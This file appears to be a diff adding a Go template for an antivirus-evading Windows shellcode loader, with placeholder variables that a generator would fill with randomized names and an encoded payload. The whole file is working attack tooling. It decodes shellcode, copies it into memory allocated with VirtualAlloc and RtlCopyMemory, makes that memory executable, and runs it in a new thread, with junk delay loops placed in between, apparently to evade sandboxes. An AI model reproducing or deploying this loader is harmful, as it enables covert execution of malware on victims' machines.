@@ -1,0 +1,51 @@
+package main
+
+import (
+	"encoding/hex"
+	"encoding/base64"
+	"golang.org/x/sys/windows"
+	"time"
+	"unsafe"
+)
+var $keyName []byte
+$method$
+func $genEXE(code []byte) {
+	addr, _ := windows.VirtualAlloc(uintptr(0), uintptr(len(code)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	ntdll := windows.NewLazySystemDLL("ntdll.dll")
+	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
+	$gd()
+	RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&code[0])), uintptr(len(code)))
+	var oldProtect uint32
+	windows.VirtualProtect(addr, uintptr(len(code)), windows.PAGE_EXECUTE_READ, &oldProtect)
+	$gd()
+	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+	$gd()
+	CreateThread := kernel32.NewProc("CreateThread")
+	$gd()
+	time.Sleep(5000)
+	thread, _, _ := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)
+	windows.WaitForSingleObject(windows.Handle(thread), 0xFFFFFFFF)
+}
+func $gd() int {
+	dd := time.Now().UTC().Day()
+	time.Sleep(200)
+	var num = 1
+	var nn = 1
+        for num <= dd {
+            num++
+        }
+                for nn <= num {
+                   nn=num+nn
+                }
+	return dd + time.Now().Second()
+
+}
+
+func main() {
+	$bbdata := "$bdata"
+	$keyName = []byte("$keys")
+	$gd()
+	$shellCodeHex := $getDeCode($bbdata)
+	$gd()
+	$genEXE($shellCodeHex)
+}
